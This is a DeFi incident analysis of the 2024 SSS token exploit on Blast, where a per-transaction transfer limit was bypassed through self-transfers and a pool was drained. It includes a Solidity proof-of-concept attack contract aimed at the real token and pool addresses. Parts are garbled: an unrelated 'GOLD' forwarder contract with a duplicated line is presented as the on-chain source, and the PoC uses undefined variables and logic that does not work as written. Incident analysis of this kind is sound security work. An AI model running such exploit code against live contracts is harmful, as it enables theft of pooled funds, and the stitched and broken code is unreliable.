# SSS — maxAmountPerTx Bypass via Recursive Self-Transfer Vulnerability Analysis

| Field | Details |
|------|------|
| **Date** | 2024-03 |
| **Protocol** | SSS (Blast) |
| **Chain** | Blast |
| **Loss** | ~$4,800,000 (1,393 ETH) |
| **Attacker** | [0x6a89a8C6](https://blastscan.io/address/0x6a89a8C67B5066D59BF4D81d59f70C3976faCd0A) |
| **Vulnerable Contract** | [SSS 0xdfDCdbC7](https://blastscan.io/address/0xdfDCdbC789b56F99B0d0692d14DBC61906D9Deed) |
| **Attack Contract** | [0xDed85d83](https://blastscan.io/address/0xDed85d83Bf06069c0bD5AA792234b5015D5410A9) |
| **Pool** | [0x92F32553](https://blastscan.io/address/0x92F32553cC465583d432846955198F0DDcBcafA1) |
| **Root Cause** | Bypassed `maxAmountPerTx()` transfer limit via recursive self-transfer, then sent the excessively accumulated SSS tokens to the pool and swapped for WETH |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-03/SSS_exp.sol) |

---

## 1. Vulnerability Overview

The SSS token uses `maxAmountPerTx()` to enforce a per-transaction transfer limit, but this limit can be bypassed via recursive self-transfers. The attacker converted 1 ETH to WETH, swapped it for SSS, then accumulated a large amount of SSS by bypassing the transfer limit through recursive self-transfers. They then sent SSS to the pool in chunks while respecting the `maxAmountPerTx()` limit, and drained 1,393 ETH via the pool's `swap()`.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable code: maxAmountPerTx can be bypassed via self-transfer
function transfer(address to, uint256 amount) public override returns (bool) {
    require(amount <= maxAmountPerTx(), "exceeds max per tx");
    // The same logic applies to self-transfers (to == msg.sender)
    // Internal state can be manipulated via recursive self-transfer
    _transfer(msg.sender, to, amount);
    return true;
}

function maxAmountPerTx() public view returns (uint256) {
    return totalSupply() * MAX_TX_PERCENT / 100;
}

// ✅ Safe code: block self-transfers + enforce cumulative limit
mapping(address => uint256) private _txAmountInBlock;

function transfer(address to, uint256 amount) public override returns (bool) {
    require(to != msg.sender, "self transfer not allowed");
    require(amount <= maxAmountPerTx(), "exceeds max per tx");
    _txAmountInBlock[msg.sender] += amount;
    require(_txAmountInBlock[msg.sender] <= maxAmountPerTx() * 3, "block limit exceeded");
    _transfer(msg.sender, to, amount);
    return true;
}
```

### On-Chain Source Code

Source: Sourcify verified

```solidity
// File: Forwarder.sol
contract GOLD {
contract GOLD {
    address payable public destination;

    function initialize(address payable _destination) public {  // ❌ Vulnerability
        require(_destination != address(0), "Invalid destination");
        destination = _destination;
    }

    receive() external payable {
        require(destination != address(0), "Not initialized");
        destination.transfer(msg.value);
    }
}
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─→ [1] 1 ETH → Convert to WETH
  │
  ├─→ [2] Router: Swap WETH → SSS
  │
  ├─→ [3] Bypass maxAmountPerTx via recursive self-transfer
  │         └─ Accumulate large amount of SSS via internal state manipulation
  │
  ├─→ [4] burn() excess tokens to prevent arithmetic overflow
  │
  ├─→ [5] Send to pool in chunks while respecting maxAmountPerTx limit
  │
  ├─→ [6] Pool.swap() — extract large amount of WETH using accumulated SSS
  │
  └─→ [7] ~1,393 ETH (~$4.8M) profit
```

## 4. PoC Code (Core Logic + Comments)

```solidity
interface ISSS {
    function transfer(address to, uint256 amount) external returns (bool);
    function burn(uint256 amount) external;
    function maxAmountPerTx() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
}

interface Uni_Pair_V2 {
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
}

contract AttackContract {
    ISSS        constant SSS    = ISSS(0xdfDCdbC789b56F99B0d0692d14DBC61906D9Deed);
    Uni_Pair_V2 constant pool   = Uni_Pair_V2(0x92F32553cC465583d432846955198F0DDcBcafA1);
    IWETH       constant WETH   = IWETH(0x4300000000000000000000000000000000000004);

    function testExploit() external payable {
        // [1] Swap WETH → SSS
        WETH.deposit{value: 1 ether}();
        swapWETHToSSS(1 ether);

        // [2] Bypass maxAmountPerTx via recursive self-transfer
        uint256 maxTx = SSS.maxAmountPerTx();
        while (SSS.balanceOf(address(this)) > maxTx * 2) {
            SSS.transfer(address(this), maxTx);  // self-transfer
        }

        // [3] burn to prevent arithmetic overflow
        uint256 excess = SSS.balanceOf(address(this)) - targetAmount;
        SSS.burn(excess);

        // [4] Send to pool in chunks then swap
        uint256 chunkSize = SSS.maxAmountPerTx();
        for (uint i = 0; i < targetAmount / chunkSize; i++) {
            SSS.transfer(address(pool), chunkSize);
        }

        // [5] Extract WETH from pool
        pool.swap(wethOut, 0, address(this), "");
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|----------|
| **Vulnerability Type** | Transfer Limit Bypass |
| **CWE** | CWE-840: Business Logic Errors |
| **Attack Vector** | External (recursive self-transfer + pool swap) |
| **DApp Category** | ERC20 transfer-restricted token (Blast) |
| **Impact** | Full pool liquidity drained (~$4.8M) |

## 6. Remediation Recommendations

1. **Block self-transfers**: Revert transfers where `to == msg.sender`
2. **Per-block cumulative limit**: Cap the total transfer volume from the same address within a single block
3. **Transfer cooldown**: Apply block-based cooldown restrictions on consecutive transfers from the same address
4. **Pool protection**: Apply transfer limits equally to transfers directed at pool contracts

## 7. Lessons Learned

- A single per-transaction limit (`maxAmountPerTx`) can be easily bypassed via a self-transfer loop.
- ERC20 transfer restriction mechanisms must be tested against all edge cases (self-transfer, chunked transfers, recursive calls).
- The same token design vulnerabilities recur in emerging L2 ecosystems such as Blast.